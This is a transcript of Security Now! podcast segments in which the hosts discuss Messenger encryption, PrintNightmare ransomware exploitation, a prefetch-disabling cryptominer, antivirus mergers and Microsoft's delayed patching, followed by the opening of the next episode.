LEO:  That actually makes sense.  I mean, that was the whole idea of cookies in the first place, was only the first-party site should be able to access that information.



STEVE:  Yes, exactly.  And it was when third-parties began becoming prevalent and said, hey, you know, somebody realized, I can send a cookie?  And it'll pop up, it'll be stored there?  And when the same guy goes somewhere else?  Hey, that's great.  Like, yeah, not for us.  And so if this change happens, I mean, it is such a clean solution.  The remaining problem, as I said, is the fingerprint-y sort of things.  And it's well understood.  It's recognized.  And you have to wonder why a website needs to know the angle at which I'm holding my phone.  That's just, you know, yeah, how is that useful?



LEO:  Right, right.



STEVE:  Okay.  So something that is useful, Facebook finally adds end-to-end encryption to their base Messenger product.  It was back in March of 2019, more than two years ago, that Facebook's CEO, Mark Zuckerberg, proudly stated, as if they had just discovered it, that "The future of communication will increasingly shift to private, encrypted services where people can be confident that what they" - I'm having not to laugh - "that what they say to each other stays secure, and their messages and content won't stick around forever."  So of course many industry observers rolled our eyes at this, since even two years ago at this announcement, which was only to express an intention, Facebook was arriving quite late to the party.



Last week, yes, on Friday the 13th, Facebook's Ruth Kricheli, Director of Product Management for Messenger, posted the news:  "Today, we're rolling out the option to make voice and video calls end-to-end encrypted on Messenger, along with updated controls for disappearing messages.  People expect their messaging apps to be secure and private" - whoa, who woulda thunk - "and with these new features, we're giving them more control over how private they want their calls and chats to be.



"Option for end-to-end encrypted voice and video calls will be available.  Since 2016 we've offered the option to secure your one-on-one text chats with end-to-end encryption.  In the past, we've seen a surge in the use of audio and video calling, with more than 150 million video calls a day on Messenger.  Now we're introducing calling to this chat mode so you can secure your audio and video calls with this same technology, should you choose."



So I did think it was interesting to note that in explaining what end-to-end encryption meant, Ruth's posting said:  "The content of your messages and calls in an end-to-end encrypted communication is protected from the moment it leaves your device to the moment it reaches the receiver's device."  I don't know how carefully worded that may have been, but at least it was refreshingly accurate.  Those who follow this podcast know that the point of attack simply moves interception to before departure or after arrival.  And the huge advantage of grabbing it at either end is that you're potentially obtaining all of a targeted user's communications and without the pesky need to filter it out of everyone else's.



And in case anyone listening to this podcast actually uses Facebook's Messenger system - I'm not judging - you might be interested in knowing that they also announced that they had updated its expiring message feature within end-to-end encrypted chats, you know, something I've always been dubious about because presumably you could take a picture of the screen, if you really care.  Ruth's post explained that "People don't always want or need their messages to stick around, and the timer controls let someone decide when their messages expire in the chat.  We've updated this setting to provide more options for people in the chat to choose the amount of time before all new messages disappear, from as few as five seconds" - boy, you'd better read quickly - "to as long as 24 hours."



And two final points, for the sake of completeness:  They also plan to begin testing end-to-end encryption for group chats, including voice and video calls, for friends and family that already have an existing chat thread or are already connected.  They're also going to begin a test for delivery controls working with end-to-end encrypted chats.  This is designed to prevent unwanted interactions by deciding who can reach the chats list, who goes to the requests folder, and who cannot send messages to the user at all.



And lastly, they plan to launch a limited test between adults in certain countries to allow Instagram DMs to also have opt-in end-to-end encryption.  They said, similar to the way Messenger works today, an existing chat or mutual following relationship must exist first.  At which point optional encryption can be enabled.  So Facebook begins to slowly and cautiously inch its way forward toward this goal of mostly catching up with what other platforms and third-party solutions have long been providing.  Better late than never.  Eventually they might even turn it on by default.  Oh, my goodness.



Okay.  So to no one's surprise, and exactly as predicted, attackers have immediately jumped upon the myriad PrintNightmare nightmares to help them move through compromised enterprise networks after first gaining a foothold.  Last Thursday, Cisco's Talos group posted:  "Another threat actor is actively exploiting the so-called PrintNightmare vulnerability in Windows' print spooler service to spread laterally across a victim's network as part of a recent ransomware attack."  They said:  "While previous research found that other threat actors had been exploiting this vulnerability, this appears to be new for the threat actor Vice Society.



"Talos Incident Response's research demonstrates that multiple distinct threat actors view this vulnerability as attractive to use during their attacks and may indicate that this vulnerability will continue to see more widespread adoption and incorporation by various adversaries moving forward.  For defenders, it is important to understand the attack lifecycle leading up to the deployment of ransomware.  If users have not already, they should download the latest patch for PrintNightmare from Microsoft."



And also, last Wednesday the CrowdStrike security blog - and I should mention that CrowdStrike is a sponsor of the podcast - was titled "Teaching an Old Dog New Tricks:  2017 Magniber Ransomware Uses PrintNightmare Vulnerability to Infect Victims in South Korea."  They said:  "CrowdStrike recently observed new activity related to a 2017 ransomware family known as Magniber, using the PrintNightmare vulnerability on victims in South Korea.  On July 13, CrowdStrike successfully detected and prevented attempts at exploiting the PrintNightmare vulnerability, protecting customers before any encryption takes place.  When the PrintNightmare vulnerability was disclosed, CrowdStrike intelligence assessed the vulnerability will likely be used by threat actors as it allowed for possible remote code execution and local privilege escalation.  This assessment proved accurate in light of the recent incident."



So I just wanted to note that, sure enough, this was the concern, right, that while this didn't provide in the typical case a remote access, even access inside of a network by all the various vectors that we've been talking about the last few months, with what turns out to be a very poorly designed-looking print subsystem for Windows, it immediately got picked up and is being used and being seen now in the wild, leveraged to amplify attacks by anybody who wants to get in and spread throughout an enterprise's network.



Okay.  I really got a kick out of this next piece.  You've got to love this.  A new cryptomining botnet has begun modifying the operating configuration of the CPUs on Linux servers it gains access to, in order to increase the performance and efficiency of its cryptocurrency mining operation.  Okay.  Specifically, the mining code is modifying one of its processor's MSRs - that's the Machine Specific Registers, which are the - that's the jargon that Intel uses for the registers that are not part of the normal instruction set, but which can be used to tweak the operation down at the instruction microcode level.  In this case, the mining code is disabling the CPU's hardware prefetch.  Hardware prefetch is an optimization that is enabled by default, as its name suggests.  It allows the processor to predict and to load data in its cache, based on the operations that are likely to be required in the near future.



The security firm Uptycs, spelled U-P-T-Y-C-S, spotted a cryptomining botnet that was breaching Linux servers, then downloading the Linux MSR, the Machine Specific Register driver, installing it into Linux, then using that driver to disable hardware prefetching before installing a version of the XMRig which both legitimate and illegitimate users often choose to mine cryptocurrency.  Uptycs believes that the attacker likely got the idea to disable hardware prefetching after reading the XMRig documentation, which states that XMRig can obtain a 15% speed boost, that is, improvement in cryptomining performance, if hardware prefetching is disabled.



As we know, hardware prefetching is a good thing, if it's able to properly anticipate the CPU's future needs by prefetching data that does wind up being needed.  But that prefetch data needs to be stored somewhere.  So prefetching can be a bad thing if the prefetching logic is misfiring, prefetching data that's never used and in the process evicting data that was going to be reused from the processor's memory cache, thus forcing it to be reloaded.  So it can work against you.



Well, it turns out it works against the XMRig's cryptomining algorithm.  In this case, after infection with this botnet, not only is the infected machine going to run hotter, need more cooling, consume a lot more power, and have its overall lifetime shortened, but it's going to be slower to service the machine's legitimate needs, not only because the CPU will be busy, you know, mining cryptocurrency, but also because when it begrudgingly releases some spare cycles to do whatever it's supposed to be doing, a useful speed optimization, which probably would have been speeding up that process, will have been turned off as a consequence of the infection.  So yes, just another thing to look for.



I wanted to also mention, just sort of in keeping track of the  industry, that NortonLifeLock and Avast are merging their users and businesses in a deal valued somewhere between $8.1 and $8.6 billion.  So to provide a bit of context and history, prior to this merger with Avast, NortonLifeLock had acquired the German AV maker Avira [A-V-I-R-A] for $360 million in cash last December, so December 2020.  And almost exactly a year before that, NortonLifeLock was formed in November of 2019 when Symantec sold off its enterprise business to Broadcom for $10.7 billion, then essentially rebranded themselves as a consumer and small business operation as NortonLifeLock.



So now Avast is disappearing, also being absorbed into NortonLifeLock, which will be growing still larger.  Under the terms of the merger, Avast shareholders will receive a combination of cash and newly issued shares in NortonLifeLock and will hold approximately 14% of the merged company's total shares.  The combined company will have dual headquarters, one in Prague, that's in the Czech Republic, and the other in Tempe, Arizona.  So essentially both of the companies' headquarters get to stay.  I don't remember who's who.



LEO:  Avast is in Prague.



STEVE:  Oh, yeah, I know that Avast is in Prague. 



LEO:  Oh, who gets to be president?  Yeah.



STEVE:  Yeah.  One gets to be president, and the other guy is going to be the CEO.  So kind of a co-president.



LEO:  It's kind of funny because both Avast and Norton have had security problems in the past.  I think Avira did, too, if I remember correctly.  I might be wrong on that.



STEVE:  Yeah, I do, I think we might have talked about Avast.



LEO:  I know Avast had a big issue.  So great.  So there you go.  Three products we don't recommend, all wrapped up into one.  But what's amazing to me is $8 billion for Avast.



STEVE:  Yes.



LEO:  Holy cow.



STEVE:  And here's the other thing.  That seems like a lot of money.



LEO:  Yeah.



STEVE:  They're going to have an estimated user base of half a billion users.



LEO:  Wow.



STEVE:  500 million users.



LEO:  I wonder if that includes all the people who've got it installed as trial ware on their Windows install.



STEVE:  Yeah, exactly.



LEO:  Yeah.



STEVE:  Again, as you said, Leo, and I'm glad you mentioned it, nothing that we're suggesting anybody do.



As we know, the fact that Windows 11 would require support for v2.0 of the Trusted Platform Module, TPM v2.0, this came as surprising and unwelcome news to many Windows 10 users whose hardware lacks TPM 2.0.  And this is particularly annoying since Windows 10 runs just fine on such hardware, and we all know that Windows 11 is just Windows 10 with its pointy corners rounded off.  Yet Microsoft has said no TPM 2.0, no Windows 11 for you.  So in a very nice bit of news from the motherboard manufacturer ASUS, which will hopefully become an industry-wide trend, ASUS is working to make the upgrade to a Windows 11 easier, and in some cases possible for users of their motherboards by offering  updated BIOSes for, get this, 207 different motherboards.



Now, some ASUS BIOSes may already support Windows 11 requirement for TPM 2.0 and might only need to have one of two possible BIOS settings enabled, depending upon which processor the motherboard uses. So that would be either you'd turn on Intel Platform Trust Technology (Intel PTT) or AMD Platform Security Processor.  That's what they're called in their respective ASUS BIOSes.  Turn whichever one of those you see on, and if you have TPM 2.0 you're good to go.  But since the BIOS may be somewhere some users fear to tread, an alternative is to simply download and run ASUS's new BIOS for your particular motherboard, any one of 207.  It will load with TPM v2.0 deliberately pre-enabled, and thus ready for the forthcoming upgrade to Windows 11, painlessly.  I've got a link in the show notes to ASUS's page, or I'm sure you can just find it at ASUS under "Getting ready for Windows 11."  



LEO:  There's TPM in software, right, like BIOS TPM; right?



STEVE:  Well, yes, there is TPM in - Intel has a Secure Enclave technology which essentially allows it, as long as the processor supports Secure Enclave, then that's sort of a - it's no longer a separate chip on the motherboard.



LEO:  Right.



STEVE:  It is built into the processor.



LEO:  Got it, got it.



STEVE:  And that's actually better because, as we know, you can hang a digital logic analyzer on the little 8-pin EEPROM which the TPM Module uses.  And people have done this and watched the BitLocker key move across the wire and capture it.  So it really is better if it's built-in.  Although there have been some security concerns about how tight that Enclave is locked up from Intel.



LEO:  Right, right.



STEVE:  But anyway, I thought it was very cool that they're saying, hey, not a problem if you have an ASUS motherboard.  Find your motherboard, download the program, you know, it's a Windows-based update.  So you don't have to figure out how to boot yourself or anything.  And it will update your BIOS, giving you TPM 2.0 if you don't have it, and making sure that it's turned on.  So then whenever it is that this happens, Windows 11 will just run on that hardware.  So nice going, ASUS.  Congrats on that.



A little kind of a funny piece of errata.  L.T., although he doesn't think it's funny, L.T. Southall, and he tweeted, I thought this was interesting, his Twitter handle is @oiliswell, O-I-L-I-S-W-E-L-L.  And that sort of suggests that he is authoritative.  He said:  "Every time I hear you or Leo mispronounce the term SCADA, I expect someone will correct you.  That obviously has not happened.  The correct pronunciation is 'scayda.'  The first A is long."  And I'm probably guilty of saying SCADA.  I think, I mean, that sounds familiar.



LEO:  Well, I've got to point out it's an acronym, so the pronunciation is not defined.



STEVE:  Right.  Anyway, he says:  "I do know what I'm talking about, having spent 40 years in that business."  And given that his Twitter handle is @oiliswell, yes...



LEO:  He's in the oil business.



STEVE:  I get a feeling that maybe SCADA and you are buddies.  So thank you.  I appreciate the correction.  I will do my best to make the first A...



LEO:  I'm going to still say SCADA, sorry.  I think you can, just like GIF, you can choose your pronunciation of acronyms.



STEVE:  Yes.



LEO:  It's not...



STEVE:  Exactly.  And there again, I've always been a "jif" person, so...



LEO:  Supervisory Control and Data Acquisition.



STEVE:  That's right.  That's right.



LEO:  I'll pronounce it that way.  How about that?



STEVE:  So I just wanted to mention something that did come back from Darragh Duffy.  He said:  "Hi, Steve.  I just listened to Episode 831.  Another suggested reason why Apple are implementing a portion of CSAM on their device is that there's a suggestion that Apple is going to encrypt iCloud backups at some point in the future."  He says:  "(Currently they don't.)"  He says:  "Congrats on the 16 years of great work and security insights."



Okay.  So the general consensus has settled into it not being the idea of checking cloud-based image storage for illegal content that so much upsets people.  And Leo, I know you guys talked about this at the beginning of MacBreak Weekly.  We're all trying to not keep talking about this, so I'll just make this one last point.  We made the point here on this podcast of noting last week that currently everyone but Apple is already doing that.  And the fact that those who are scanning are discovering a truly disturbing amount of illegal photographic content suggests even more strongly that Apple needs to be doing this, too, so as not to become the de facto safe harbor for such material.



But what's being regarded as Apple's mistake is that their solution is to load the hashes of these illegal photos onto everyone's individual devices rather than just quietly doing it themselves on their servers.  No one wants to have anything to do with even pre-digested hashed versions of that crap on their personal devices.  On Sunday's TWiT show, Mike Elgan made the point that users are wrong to think that they have any sovereign governance over the content and operation of their various devices, since iOS is only available for their use under license from Apple.



Of course, while this may be literally and legally true, and Mike of course is right, it's the perception that matters, and Apple is otherwise all about amplifying and highlighting the fact that these are intimately personal gadgets.  Apple probably figures that this will all blow over in time and will just become part of every system's accepted operation.  It's going to be interesting to see how this evolves.



I'm skeptical about the motivation Darragh notes about whether this is being done in this way, different from the way everyone else does it, in preparation for Apple making iCloud even further encrypted.  iCloud's lack of full end-to-end encryption, if that's what we want to call it, has useful recovery benefits for users.  All of Apple's ecosystem has already accepted this aspect of iCloud, and no one appears to care.  And it does create a bit of useful safety valve for law enforcement's needs, allowing Apple to respond at least a bit in some specific circumstances to subpoenas.



And it's really not clear to me how much people actually care about encryption.  It seems like a good thing.  I think that everyone will take whatever they can get.  If it's there, great.  But people see features and encryption tending to limit what can be done.  Sure, super-protecting photos of their cat and last night's lasagna is likely not high up on people's lists.  And if it is, don't upload them to the cloud.  Fine.  These days, most people understand that once something is "in the cloud," it's never possible to really remove it.  So anyway, nice piece of feedback.  I don't think we'll be talking about this anymore.



LEO:  Yeah.  Well, okay.  Good luck.



STEVE:  Hopefully.



LEO:  We're trying not to, anyway.



STEVE:  Yeah.  In a really great example of one of my favorite concepts that we've talked about on this podcast many times, what I call the "tyranny of the default," Joe Lyon tweeted.  He said:  "The tyranny of the default.  In Germany, there is about a 12% rate of organ donation.  In neighboring Austria, that rate is 99%."



LEO:  Wow.



STEVE:  "In Denmark, the rate is 4%; and in neighboring Sweden it's 89%.  The Danes and the Swedes are very much similar in almost all respects, so why the huge discrepancy?  The answer is that in Denmark, where the donor rate is 4%, you check the box if you would like to opt INTO the organ donor program.  Whereas in Sweden, where the rate is 89%, you check the box if you would like to opt OUT of the organ donor program."



LEO:  Interesting.  The tyranny of the default, yup.



STEVE:  Tyranny of the default.  When you really don't have to otherwise worry about the tyranny of the default any longer.



Paul Durham, he said:  "Hi, Steve.  You and your incredible Security Now! have inspired me to do something about the time gap between available and applied software and firmware updates, and how this gap leaves the consumer vulnerable.  I am building a platform to allow developers and vendors to broadcast the availability of firmware and software updates to subscribers.  You frequently mention this gap as a serious issue, and I hope our platform will significantly close that gap.  Your thoughts on whether this will be useful and worthwhile?  Thanks."



This came via DM.  I'm sure Paul doesn't mind me sharing it.  I replied, saying go.  I think that would be absolutely great.  And I think if there were any one thing I can think of that has a hope of helping, it's that.  I have talked, I said, like make sure you're getting the email of your vendors.  If somebody retired and takes their email account with them, and that's where they were going, email should go to a vulnerability alert account, rather than to an individual, and then be maybe forwarded or copied to somebody who's currently handling it.  I mean, I don't know how.  But clearly it's important for the word to get out.  So I'm anxious to see what Paul comes up with.  I just wanted to let everybody know that such work is in progress, and to share my props to him for this.



And, finally, CatGuy tweeted:  "Hi, Steve.  I have a fairly simple inquiry for you.  Given your past episodes on the dangers of end-of-lifed routers and other peripheral devices, is it safe to use such a router as an access point behind a NAT router?  I'm starting to segment my home network, planning on using a smart switch and VLANS.  All the IoT was going to live on my old 2.4 GHz D-Link.  But it occurs to me to question if there is risk here, too."



And to answer your question, CatGuy, I will tell you that is exactly what I have done.  I have another WiFi router set up as an access point.  It's an older one.  Because almost all IoT, I mean, some newer IoT I know also offers 5G, but they all offer 2.4.  And like I've talked about these various electric plugs and thermometers and things, and thermostats, they're all 2.4 because that's sort of the universal, and they're trying to keep their cost to an absolute bare minimum.  As I said, I don't know how you can sell me a light switch, I mean, a light plug which is a switch, which has Bluetooth and WiFi and a processor, and is on the Internet doing DHCP to get an IP and connecting to servers in the cloud, for $5.  I mean, $5.  Really.  I don't know how that happens.  But it does.



And anyway, so yes, what CatGuy has done is my architecture, it's on the bookshelf up there above me is a wireless router running not as a router, but as an access point, and it is plugged into one of the ports of my little pfSense device on a different entire network.  I run internally here, I'm on 10-dot.  It's a 192.168 network.  So completely different network.  Sometimes I need to briefly talk to those devices, so I will establish a connection across them in my pfSense config, do what I need to do, and then take it down so that WiFi is completely separate from the rest of my WiFi and wired network here.  So that's the way to do it.



LEO:  That's your three dumb routers.  Well, it's two dumb routers, yeah.



STEVE:  Yes, the equivalent.



LEO:  Yeah.



STEVE:  Yeah.  Actually the dumbness was the way to use NAT.  Instead I've got pfSense, which is a super smart router.



LEO:  So good, yeah.



STEVE:  So it's one super smart router



LEO:  One super smart.  And then one dumb.



STEVE:  But what's cool is that it's actually four NICs.  So each, instead of being...



LEO:  So you do have VLANs.



STEVE:  Yes.



LEO:  Actually hardware LANs, really.



STEVE:  You actually have hardware LANs.  Yes, they have separate NICs.  So one NIC is a 10-dot, one is a 192.168, and they're just - there's no way for them to see each other.



LEO:  Yeah, yeah. Very nice.  Very clever.  Okay, Steve.  Let's hear it.  What did Microsoft - what did they do this time?



STEVE:  Oh.  So as I mentioned at the top of the show, I didn't start off today's podcast with this title or topic in mind.  Far from it.  This section for today was originally up where it usually is, with the generic security news, under the title of Patch Tuesday Redux.  But sometimes it's necessary to step back and perform a bit of a reality check.  One piece of news from last week hit me as being so unconscionable that, as I started to explore it and what it actually meant, it became clear that the only way to read the facts was that something has gone very wrong at Microsoft.  I have no illusions that this podcast will change Microsoft's behavior.  But perhaps it's time for us to think about changing ours.



So what follows is what I started off writing, so it starts off sounding like any other Patch Tuesday update.  I said:  "Last Tuesday, Microsoft released fixes" - it is a Patch Tuesday update - "Microsoft released fixes for 44 security vulnerabilities, with seven of the vulnerabilities being rated critical and three of those being zero-days.  The other 37 were rated as being important.  Even though the total of 44 is back to being fewer, 13 of the patches fixed remote code execution vulnerabilities, and eight were information disclosures.



"The affected Microsoft products included .NET Core & Visual Studio, ASP.NET Core & Visual Studio, Azure, Windows Update, Microsoft Print Spooler Components, Windows Media, Windows Defender, Remote Desktop Client, Microsoft Dynamics, Microsoft Edge (the Chromium version), Microsoft Office, Microsoft Office Word, Microsoft Office SharePoint, and others.



"Perhaps the most prominent patch released last Tuesday dealt with the Windows Print Spooler Remote Code Execution vulnerability, which has been a major focus since its disclosure in June.  And what makes Microsoft's recent performance all the more embarrassing is that the day following Tuesday's patch batch, last Wednesday, believe it or not, Microsoft acknowledged still another remote execution vulnerability in Windows Print Spooler which it said it's working to remediate.  This Print Spooler remote code execution vulnerability is being tracked as CVE-2021-36958 and carries a CVSS score of a mere 7.3."



In their disclosure of this problem, Microsoft wrote:  "A remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations.  An attacker who successfully exploited this vulnerability could run arbitrary code with system privileges.  An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights."  So no surprise there, right?  That's the standard boilerplate for all the bad things that can happen, and also typically do happen, whenever we allow bad guys to remotely execute their code on our machines.



Then in the show notes I have a tweet from Victor Mata.  He tweeted on August 11, which was last Wednesday:  "Hey guys, I reported the vulnerability in December '20, but haven't disclosed details at MSRC's request.  It looks like they acknowledged it today due to the recent events with print spooler."  So now here we are again with another newly disclosed Windows Print Spooler RCE.  That's not good.  I mean, It's really not good.  But what's difficult to understand is that we're also told that Microsoft was first made aware of this problem way back in December of 2020 by Accenture Security's Victor Mata of FusionX.  So another remote code execution vulnerability in the Windows Print Spooler, which Microsoft has known about since December?  And now it's mid-August.  And now they're telling us about it and saying that they're scrambling to fix it.



Will Dormann, CERT Coordination Center's Vulnerability Analyst, almost predictably tweeted in that thread that Victor started.  He tweeted:  "Sometimes I wonder why I bother writing things up and notifying vendors."  Yeah, I'd wonder, too.



Microsoft is nothing if not a savvy software publisher with effectively unlimited financial resources. Microsoft's current cash on hand is $130 billion.  $130 billion of cash just lying around right now.  They could have afforded to hire a talented coder to fix this one problem without even noticing the expense.  Not even a rounding error.  So they must have decided  and I'm really not kidding about this.  They must have decided, in some gold-plated ivory tower somewhere, that bugs in their code don't really matter that much.



We all assume, "Oh my god, a remote code execution exploit.  The sky is falling."  But Microsoft clearly doesn't think so, or they'd prop up the sky if that was a problem.  They certainly have the money to do so.  But shhh, don't tell anyone.  I don't think they really care anymore.



Think about Microsoft's behavior all this year through the Exchange Server fiasco, which directly hurt and damaged so many of their own customers.  Not other people's customers.  Their customers.  Their software.  Does anyone think that they lost a single one of those Microsoft enterprise customers as a result?  We know they didn't.  Microsoft is the only game in town, and the prior investment in Microsoft's ecosystem is far too great.  So what did not fixing those Exchange Server flaws quickly cost them?  Nothing.



And notice that the attackers are the ones who are increasingly being blamed.  We're not blaming the victims of ransomware attacks.  We're not blaming the faulty software which those attackers used to gain their foothold, exfiltrate victims' proprietary data, and encrypt their victims' machines.  Now we're blaming the attackers.  It's their fault for taking advantage of our flaws and weaknesses.  It's their home government's fault for allowing them to do that.  The U.S. Government is loudly screaming, "You'd better stop attacking us, or else," while Microsoft sits on another remote code execution flaw in Windows Print Spooler for eight months.



Microsoft's not dumb.  They didn't get to be where they are by being dumb.  Microsoft has always known what matters.  And any unbiased appraisal of their demonstrated behavior this year would have to conclude that they are now only paying lip service to their software vulnerabilities, and only then because the politics of the situation requires them to at least appear to care.  They are allowing a great many serious software vulnerabilities, of which they have been previously made aware, to remain unpatched for months, while sitting on $130 billion previously paid to them by those same customers who are being directly hurt by those easily patched vulnerabilities.



By delaying the repair of the Exchange Server vulnerabilities at the start of this year, which they were told of in 2020, but didn't bother to repair until they were being used to attack their own customers by the end of March 2021, they directly enabled those devastating attacks against their own paying customers.  And so now we're learning of another case where they've known of a remote code execution vulnerability for eight months.  How are we to understand any of this, except as the result of a brutal cost-benefit analysis?  They have so much money that they could easily arrange to fix these things if they cared at all.



It's not as if these are difficult problems.  When it suddenly becomes an emergency, the problems are fixed and released immediately.  And it's not as if these are unknown problems.  Researchers are bringing these problems to them to fix, asking them to do that, literally handing them to them.  But time and time again, Microsoft doesn't bother.  Are they so busy working on Windows 11, getting those rounded corners just right, arguing about whether or not to force the new centered menu upon their Windows 11 users, that they can't spare even one employee to fix a serious problem that's been laid at their feet?



At this point in 2021, I think we really need to stop and ask ourselves an important question.  Is this the behavior of a company we should continue to support?  Is this the behavior of a company that deserves our trust and loyalty?  Really, do they have it?



What we have been seeing this year is culpable negligence on Microsoft's part.  There is no possible excuse for their behavior.  The only possible explanation is that they just don't care anymore.  They have the money, they have the resources, and they're being handed the knowledge to prevent devastating attacks against their own customers who have enriched them.  And they're doing nothing about it because they don't have to.  They have a monopoly on desktop computing.  There's no reasonable alternative to Windows.  In the past, they used their monopoly to abuse their competitors.  Now they're using it to abuse their own customers.



LEO:  Ooph.  I can't disagree with you.  I'm always, you know, trying to understand it, put myself in the other guy's shoes.  And I just for the life of me can't come up with a good reason why they would, for instance, wait eight months to patch something, and wait till it's a zero-day, and then say, oh, I guess we'd better fix it.  It just doesn't - I can't think of any reason why you might not want to fix it.



STEVE:  I know.  And I've been talking about this.  I've been pointing to this this year.  It's become insane.  I mean, it is not sane.



LEO:  Is it possible there are so many flaws, I mean, that there are literally tens of thousands of known serious critical flaws, that they just can't fix them all?  They have to triage it and have to wait till it's a zero-day and then say, oh, well, okay, we can fix that one now?  Is that possible?



STEVE:  No, no, because they fixed 44 this month.  It could have been 45.  But it wasn't.



LEO:  It wasn't.



STEVE:  And they knew about it for eight months.  And Leo, $130 billion.  They could have a second whole Microsoft that just fixes bugs.



LEO:  Yeah, it's really hard to...



STEVE:  They could.  They could.



LEO:  ...to think of why this could possibly be.  Except just lack of care.  They don't care.



STEVE:  And it's not like they're being forced to discover them.  They've got the whole security community finding them for them, showing them.  Here's a problem.  Here's a zero-day.



LEO:  These are good people.  I know many of these people.  They're not malicious people.  They're just like you and me.  There's got to be an explanation beyond that.



STEVE:  There is no cost to them, Leo.  It does not cost them.



LEO:  So it's a pure business decision.  It's not worth spending the time or energy to fix it because it doesn't cost us any money.



STEVE:  They don't need to.  They lost not a single customer.  



LEO:  Well, they lost me a long time ago.



STEVE:  And goodwill?  They don't have anyone's goodwill anymore.  They've got our balls is what they've got.



LEO:  Who needs goodwill when you've got them by the short hairs?  Exactly.  Well, they don't because I think there's Linux, and Linux is growing very rapidly.  I'm not proposing that it's more secure, but at least they try to fix the problems as soon as they crop up.  What would you, I mean, Steve, you still are going to use Windows because you have to.  They do have you.



STEVE:  Yeah.



LEO:  They've got you.



STEVE:  Yeah.  It is the most functional platform.  It's not even, when I'm looking for software, many of the things I want just they're not on the Mac.



LEO:  Yeah, no, I'm with you on that.



STEVE:  I mean, it's just...



LEO:  I think you would find what you needed on Linux.  I'm thinking.  But maybe not.  I don't know.  Linux, I think, fits your ethos a lot closer.



STEVE:  Well, but the nation's enterprises aren't going there.



LEO:  They're not doing it, and that's where your business lies is people buying your software running on Windows.  So you don't have a choice.



STEVE:  Well, and actually my software will be booting on Intel machines, and I will be providing ISOs.  I mean, one of the things happening with, well, actually with 6.1 now, but really with 7 is I've become completely OS agnostic.



LEO:  Good, good.



STEVE:  And that's just the reality of the world.  But again, Microsoft's not going anywhere.  They just don't have to do a better job, and they're not.  But it is causing real damage to their customers.



LEO:  Well, you're right to call them out.  You're really right to call them out.  I mean, that is absolutely the case.  Do better.  You need to do better, Microsoft.  Well, there we go.  Security Now!.  I think you should change the title to "They've Got Our Balls."  But, you know, okay, we'll go with "Microsoft's Culpable Negligence."  It's not quite as punchy, but...



Steve Gibson is at GRC.com.  That's a good place to go to get a copy of the show.  He has 16Kb audio, 64Kb audio, and transcripts so you can read along as you listen.  That's always great.  He's also got lots of other great stuff, including SpinRite, the world's best mass storage maintenance and recovery utility.  Lots of freebies.  You can leave him comments there at GRC.com/feedback.  Probably the better way to respond to Steve or to pat him on the back is @SGgrc on Twitter, @SGgrc on Twitter.  His DMs are open, so you can do that, too.



We do the show and record it and edit it and put it up on our site, as well, TWiT.tv/sn.  You can get yourself a copy right there.  If you want to watch us do it live, we do it on a Tuesday afternoon, try to do it right - we do it right after MacBreak Weekly, aiming for 1:30.  Sometimes it's a little later.  Today it was 2:00 p.m. Pacific, 5:00 p.m. Eastern, 21:00 UTC.  Tune in live and watch.  And while you're watching or listening live you can also chat live at irc.twit.tv.  Steve, I guess we'll come back here Tuesday, if Microsoft doesn't have you assassinated between now and then.



STEVE:  As I said, Leo, I think they're not going to be sponsoring this podcast any time soon.



LEO:  I can live with that.  I absolutely can live with that.  But again, you know, that's one of the reasons I like having  the idea of "listener supported" because then our only obligation is to you.  Anyway, thank you, Steve.  Have a great week.



STEVE:  Thank you, my friend.  



LEO:  See you next time.



STEVE:  Right-o.  Bye.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#833

DATE:		August 24, 2021

TITLE:		Microsoft's Reasoned Neglect

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-833.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we briefly look at Firefox's plan to block unsecured downloads.  We examine the threat posed by T-Mobile's massive and deep data breach and what current and past customers of T-Mobile should do.  We look at three additional so-called "Overlay Networks" in addition to Tailscale, and also at the consequences of another Orange Tsai Microsoft Exchange Server exploit chain discovery.  We'll also examine a simple-to-make flaw in the Razer gaming mouse installer, cover another worrisome IoT protocol screw-up, and share a couple of feedback notes and a question from our listeners.  Then I want to conclude by following up on last week's discussion of Microsoft's apparent culpable negligence with a proposed explanation of their behavior and motivation which fits the facts so well that it becomes reasoned neglect.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here with more on the T-Mobile breach and some very practical advice about what we T-Mobile customers should be doing.  We'll also talk about two more overlay network solutions that Steve likes a lot.  And then the amazing story of the Razer mouse hack.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 833, recorded Tuesday, August 24th, 2021:  Microsoft's Reasoned Neglect.



It's time for Security Now!, the show where we cover your security, your privacy, everything you need to know about how the Internet works with this guy right here, the Explainer in Chief, Mr. Steven Gibson.  Hello, Steve.



STEVE GIBSON:  Hey.  I like that "set your phasers to stun" line, Leo.  You're going to have to hold on to that one.



LEO:  We decided everybody should turn their cell phones off and set their phasers to stun for the following program.



STEVE:  That's right.



LEO:  Yes.



STEVE:  So we're at 833.



LEO:  Wow.



STEVE:  For this second-to-the-last - this is the penultimate episode of August, Leo.



LEO:  That's amazing.



STEVE:  I've got to get that word in...



LEO:  Every time.  Every time.



STEVE:  That's right.



LEO:  It's always a penultimate something.



STEVE:  I guess that is true.  So this week I'm going to attempt to explain the inexplicable.  Last week was Microsoft's culpable negligence, which was - no one could explain it.  I asked everybody.  No explanation.



LEO:  You know, in a way, after you did that, I thought there would be lots of stories repeating that because that's stunning, eight months knowing about a flaw and not fixing it until it was a zero-day for eight months.  That should be headline news everywhere, and nobody picked it up except you.



STEVE:  No, I think we've all just been beaten into submission at this point.



LEO:  That's right.  It's like we don't expect better.  It's like, yeah, well, what do you expect?



STEVE:  Can I still type on my keyboard?  Fine.  Okay.  So I did, however, get lots of feedback from our listeners.  This week's podcast is titled "Microsoft's Reasoned Neglect."  And I think I've made a really good case for what is actually going on.  It'll be fun to discuss this with you at the end.  But first, we're going to briefly look at Firefox's plan to block unsecured downloads.  We examine the threat posed by T-Mobile's massive and deep data breach and what current and past customers of T-Mobile should do as a result.



